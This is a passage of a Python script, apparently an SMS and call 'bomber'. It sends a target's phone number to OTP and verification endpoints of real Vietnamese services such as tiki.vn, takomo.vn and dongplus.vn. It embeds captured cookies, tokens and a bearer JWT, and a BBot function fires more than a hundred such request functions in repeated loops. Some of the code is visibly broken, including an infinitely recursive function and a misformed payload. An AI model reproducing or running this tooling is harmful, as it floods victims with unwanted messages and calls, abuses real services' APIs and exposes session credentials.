    # 'cookie': '_trackity=4ce4fc3f-a56a-55e5-0167-0b11bee7bfe9; _gcl_au=1.1.835789139.1691829108; TOKENS={%22access_token%22:%22Y9QZxa28RKzGwcqfODV6jIN7LMC4kAem%22}; delivery_zone=Vk4wNjYwMjUwMDg=; amp_99d374=aHzIkl_ASe4-vXR5LQyg6_...1h85vam7n.1h85vaptl.b.h.s; _gid=GA1.2.1466793505.1692417747; tiki_client_id=494132615.1691829105; _gat=1; _ga_GSD4ETCY1D=GS1.1.1692417750.2.0.1692417750.60.0.0; _ga=GA1.1.494132615.1691829105; _hjSessionUser_522327=eyJpZCI6ImEyZDQ0MWYyLWNiMTEtNTVmYi05YjYyLTI3YzFhOGQ2MWJmYiIsImNyZWF0ZWQiOjE2OTE4MjkxMDgwMjYsImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInSessionSample_522327=0; _hjSession_522327=eyJpZCI6IjFlODNjMTdiLWFkYTctNDBjYi04ODA2LTZkZjVjZDU4OWNjYiIsImNyZWF0ZWQiOjE2OTI0MTc3NTAzNzIsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0',
    'origin': 'https://tiki.vn',
    'referer': 'https://tiki.vn/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-guest-token': 'Y9QZxa28RKzGwcqfODV6jIN7LMC4kAem',
}
  json_data = {
    'phone_number': phone,
    'captcha': {
        'status': 'passed',
        'seccode': 'YWY4MWMzMzgtMmUxOS00NDg0LWJkYmMtMWNjM2U5YmEzMWE2',
        'type': 'puzzle',
    },
}

  response = requests.post('https://tiki.vn/api/v2/customers/otp_codes', cookies=cookies, headers=headers, json=json_data)
def ff(phone): ##test tiki 2
  cookies = {
        '_gcl_au': '1.1.717969205.1692524130',
    '_gid': 'GA1.2.1655628115.1692524131',
    '_gac_UA-187725374-2': '1.1692524131.EAIaIQobChMI4rPZ3vfqgAMVCcZMAh3G1gCqEAAYASAAEgL4vfD_BwE',
    '_gat_UA-187725374-2': '1',
    '_ga_K15C064VTW': 'GS1.2.1692524131.1.0.1692524131.60.0.0',
    '_fbp': 'fb.1.1692524131107.727866848',
    '_tt_enable_cookie': '1',
    '_ttp': 'aZAbB9p3evn9GCw4g3T3uvAvk6N',
    '_hjSessionUser_2281843': 'eyJpZCI6Ijg4YjVkYWJkLWFiMmYtNTU1Yi05YzM0LTJhZjg0NWFjMTMxMyIsImNyZWF0ZWQiOjE2OTI1MjQxMzE0MTMsImV4aXN0aW5nIjpmYWxzZX0=',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_2281843': '0',
    '_hjSession_2281843': 'eyJpZCI6ImYxMDUwYTE3LWU1ZWYtNGM5Yi05YTFkLThjZmUzYzk0M2QxYiIsImNyZWF0ZWQiOjE2OTI1MjQxMzE0MjUsImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
    '_fw_crm_v': '6b3c4203-ebeb-4f50-d761-728ae7f0904d',
    '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDk4Nzg3NjQzMQ.VLz2zrZJFqhEnb65pHoymvoU9gbvs9h3hPVuAkCN9Ms',
    '_ga_ZBQ18M247M': 'GS1.1.1692524130.1.1.1692524147.43.0.0',
    '_gcl_aw': 'GCL.1692524147.EAIaIQobChMI4rPZ3vfqgAMVCcZMAh3G1gCqEAAYASAAEgL4vfD_BwE',
    '_gat_UA-187725374-1': '1',
    '_ga_ZN0EBP68G5': 'GS1.1.1692524147.1.0.1692524147.60.0.0',
    '_hjSessionUser_2281853': 'eyJpZCI6IjRkYjQ5ZGE5LWIyMmQtNWNhNi1hMzA2LWRjNTgyMTEyMDdhYyIsImNyZWF0ZWQiOjE2OTI1MjQxNDgzNjUsImV4aXN0aW5nIjpmYWxzZX0=',
    '_hjIncludedInSessionSample_2281853': '0',
    '_hjSession_2281853': 'eyJpZCI6IjhiYjM3NmNhLWYzZTMtNDM3NC04Y2I3LTc0OWU4NDU1ZGRmYiIsImNyZWF0ZWQiOjE2OTI1MjQxNDgzOTQsImluU2FtcGxlIjpmYWxzZX0=',
    '_ga': 'GA1.2.1453587830.1692524130',
    '_gac_UA-187725374-1': '1.1692524153.EAIaIQobChMI4rPZ3vfqgAMVCcZMAh3G1gCqEAAYASAAEgL4vfD_BwE',
    '_ga_03H0F9NHEX': 'GS1.2.1692524148.1.0.1692524153.55.0.0',
    }
  headers = {
        'authority': 'lk.takomo.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://lk.takomo.vn',
    'referer': 'https://lk.takomo.vn/?phone=phone&amount=10000000&term=30&utm_source=google_search&utm_medium=ThanhBinh-TKM&utm_campaign=google_search_cpc_VH_All_ThanhBinh_1&utm_term=google_search_cpc_VH_All_ThanhBinh_NationalWide_Massive_1_2&utm_content=google_search_cpc_VH_All_ThanhBinh_NationalWide_Massive_TKM___1_2_1&gad=1&gclid=EAIaIQobChMI4rPZ3vfqgAMVCcZMAh3G1gCqEAAYASAAEgL4vfD_BwE',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
}
  json_data = {
    'data': {
        'phone': phone,
        'code': 'resend',
        'channel': 'ivr',
    },
}

  response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers, json=json_data)
def dp(phone):
  cookies = {
        '_gid': 'GA1.2.864510571.1692535422',
    '_gac_UA-214880719-1': '1.1692535538.EAIaIQobChMIzYbe6KHrgAMV5A57Bx31hQUREAAYASAAEgKfVPD_BwE',
    '_gat_UA-214880719-1': '1',
    '_ga': 'GA1.2.77904008.1692535422',
    '_ga_RRJDDZGPYG': 'GS1.1.1692535421.1.1.1692535586.57.0.0',
    }
  headers = {
        'authority': 'api.dongplus.vn',
    'accept': '*/*',
    'accept-language': 'vi',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2OTI1MzU0OTEsImV4cCI6MTY5MjUzOTA5MSwidXNlcl9pZCI6NjM3NjcxLCJhZG1pbl9pZCI6bnVsbCwicm9sZXMiOltdLCJ1c2VybmFtZSI6Ijg0OTc2NDMyMzIxIn0.0RQfEfl_QeLi05VC9J0y61uJG2JK_ZXZMjNRMihLKAlH2Iv5SRL5w1N2JEFvAwofNUplKBZY6RGSFXWFNyvlIr46rhftgLi958jKVsyVhTaAkGCXEQyFcATz__2cpkYVLBdUg0FU7rXJ63s69-JfH2AxJFsN8BDXrF2N4KE5cIK6HO-nqyeEJhGa1863ioZuKSoFxSThIyNgdkZbooyReDKe58sYElSJIqGr4LoxU83_hIkBmohU2PBRKE7m_N-XFKzJ2fcuNy8vXttdDPvAWoUNXk5qjBBV_xivjvDML_tlNH_GWfmGZXsqidVX3a8wRGRQhxOAtwhMuSxvSwVTGv3DLNI9okda8qXh4pcU_FZT53rAl1PSm04duQLDdYbXlF73QQJMg1ECqXzbzN5vuUSNmB-KukHJ6f9NQ_-OOQFNf8Ghwk_vAUmXYcIw_I3JbjHbDFJqzlI2JexwSBoB0qUf62IKx9BVGq3wOkLuRbTc128Gq7co25cPYMNxoJD9mU1TALy4pD1iK4Cpq6h9nMC5hVwPsytpDfKuYnvw9gzOHJhBmr9rm1HHkWRlrrjn97J_hq7myqlCQ3q5rr7zNjw2nIdOeyKj8yjiLKfovuHLj7O1Qn3vCIjuTQcKSbsYScU9zhab6Qj0DIA-B3FdOQVYyMnfz9clw8-D6yRYL8I',
    'content-type': 'application/json',
    # 'cookie': '_gid=GA1.2.864510571.1692535422; _gac_UA-214880719-1=1.1692535538.EAIaIQobChMIzYbe6KHrgAMV5A57Bx31hQUREAAYASAAEgKfVPD_BwE; _gat_UA-214880719-1=1; _ga=GA1.2.77904008.1692535422; _ga_RRJDDZGPYG=GS1.1.1692535421.1.1.1692535586.57.0.0',
    'origin': 'https://dongplus.vn',
    'referer': 'https://dongplus.vn/user/registration/reg2',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
}
  json_data = {
    'mobile_phone': phone,
    },


  response = requests.patch('https://api.dongplus.vn/api/user/637671', cookies=cookies, headers=headers, json=json_data)
def sendcall1(phone):
    while True:
        sendcall1(phone)
    time.sleep(2)
    for b in range(amount):
            exit()
def BBot(phone, amount):
   for i in range(amount):
      threading.submit(sendcall1,phone)
      threading.submit(a1,phone)
      threading.submit(a2,phone)
      threading.submit(a3,phone)
      threading.submit(a4,phone)
      threading.submit(a5,phone)
      threading.submit(a6,phone)
      threading.submit(a7,phone)
      threading.submit(a8,phone)
      threading.submit(a9,phone)
      threading.submit(a10,phone)
      threading.submit(a11,phone)
      threading.submit(a12,phone)
      threading.submit(a13,phone)
      threading.submit(a14,phone)
      threading.submit(a15,phone)
      threading.submit(a16,phone)
      threading.submit(a17,phone)
      threading.submit(a18,phone)
      threading.submit(ff,phone)
      threading.submit(a19,phone)
      threading.submit(a20,phone)
      threading.submit(a21,phone)
      threading.submit(a22,phone)
      threading.submit(a23,phone)
      threading.submit(a24,phone)
      threading.submit(a25,phone)
      threading.submit(a26,phone)
      threading.submit(a27,phone)
      threading.submit(a28,phone)
      threading.submit(a29,phone)
      threading.submit(a30,phone)
      threading.submit(dp,phone)
      threading.submit(a31,phone)
      threading.submit(a32,phone)
      threading.submit(a33,phone)
      threading.submit(a34,phone)
      threading.submit(a35,phone)
      threading.submit(a36,phone)
      threading.submit(a37,phone)
      threading.submit(a38,phone)
      threading.submit(a39,phone)
      threading.submit(a40,phone)
      threading.submit(a41,phone)
      threading.submit(a32,phone)
      threading.submit(a43,phone)
      threading.submit(ONCREDIT,phone)
      threading.submit(cc1,phone)
      threading.submit(cc2,phone)
      threading.submit(tiki00,phone)
      threading.submit(tiki01,phone)
      threading.submit(cc3,phone)
      threading.submit(MONEYVEO,phone)
      threading.submit(cc4,phone)
      threading.submit(cc5,phone)
      threading.submit(cc6,phone)
      threading.submit(cc7,phone)
      threading.submit(apispam,phone)
      threading.submit(vieon,phone)
      threading.submit(callsms,phone)
      threading.submit(poyeye,phone)
      threading.submit(alfrescos,phone)
      threading.submit(fpt,phone)
      threading.submit(cl1,phone)
      threading.submit(vt11,phone)
      threading.submit(vnd,phone)
      threading.submit(vt12,phone)
      threading.submit(DONGPLUS,phone)
      threading.submit(cl2,phone)
      threading.submit(cl3,phone)
      threading.submit(cl4,phone)
      threading.submit(cl5,phone)
      threading.submit(cl6,phone)
      threading.submit(spamcall7,phone)
      threading.submit(cl7,phone)
      threading.submit(VIE,phone)
      threading.submit(cl8,phone)
      threading.submit(cl9,phone)
      threading.submit(ONCREDIT,phone)
      threading.submit(cl10,phone)
      threading.submit(cl11,phone)
      threading.submit(cl12,phone)
      threading.submit(kiot,phone)
      threading.submit(vayvnd,phone)
      threading.submit(viettel,phone)
      threading.submit(tamo,phone)
      threading.submit(meta,phone)
      threading.submit(call3,phone)
      threading.submit(call2,phone)
      threading.submit(call1,phone)
      threading.submit(call11,phone)
      threading.submit(call4,phone)
      threading.submit(PIZZAHUT,phone)
      threading.submit(call5,phone)
      threading.submit(call9,phone)
      threading.submit(funring,phone)
      threading.submit(dkvt,phone)
      threading.submit(fptplay,phone)
      threading.submit(vietid,phone)
      threading.submit(apitv360,phone)
      threading.submit(momo,phone)
      threading.submit(TUOITRE,phone)
      threading.submit(fpt,phone)
      threading.submit(famod,phone)
      threading.submit(tv360,phone)
      threading.submit(concung,phone)
      threading.submit(cafeland,phone)
      threading.submit(dz,phone)
      threading.submit(moneydong,phone)
      threading.submit(call10,phone)
      threading.submit(sms2,phone)
      threading.submit(funring,phone)
      threading.submit(gotadi,phone)
      threading.submit(call11,phone)
      threading.submit(fptplay,phone)
      threading.submit(vietid,phone)
      threading.submit(ahamove,phone)
      threading.submit(vieon1,phone)
      threading.submit(tiki,phone)
      threading.submit(apiv5,phone)
      threading.submit(moca,phone)
      threading.submit(gbay,phone)
      threading.submit(tgdd,phone)
      threading.submit(dkvt,phone)
      threading.submit(viettel,phone)
      threading.submit(BIBABO,phone)
      threading.submit(SWIFT247,phone)
      threading.submit(smsapi,phone)
      threading.submit(KILO,phone)
      threading.submit(GAPO,phone)
      threading.submit(PHUCLONG,phone)
      threading.submit(VIETLOTT,phone)
      threading.submit(CONCUNG,phone)
      threading.submit(GOTADI,phone)
      threading.submit(VIETID,phone)
      threading.submit(ZALOPAY,phone)
      threading.submit(VAMO,phone)
      threading.submit(OLDFACEBOOK,phone)
      threading.submit(FUNRING,phone)
      threading.submit(BIBABO,phone)
      threading.submit(cac,phone)
      threading.submit(fa,phone)
      threading.submit(moneydong,phone)
      threading.submit(VAYSIEUDE,phone)
      threading.submit(VIETLOTT,phone)
      threading.submit(ONCREDIT,phone)
      threading.submit(oldzalopay,phone)
      threading.submit(VAYVND,phone)
      threading.submit(fptplay,phone)
      threading.submit(findo,phone)
      threading.submit(AHAMOVE,phone)
      threading.submit(m1,phone)
      threading.submit(m2,phone)
      threading.submit(concac,phone)
      threading.submit(mhl,phone)
      threading.submit(F88,phone)
      threading.submit(CAFELAND,phone)
      threading.submit(DAIHOCFPT,phone)
      threading.submit(thitruong,phone)
      threading.submit(cc7,phone)
      threading.submit(tris,phone)
      threading.submit(loveyou,phone)
BBot(phone, amount)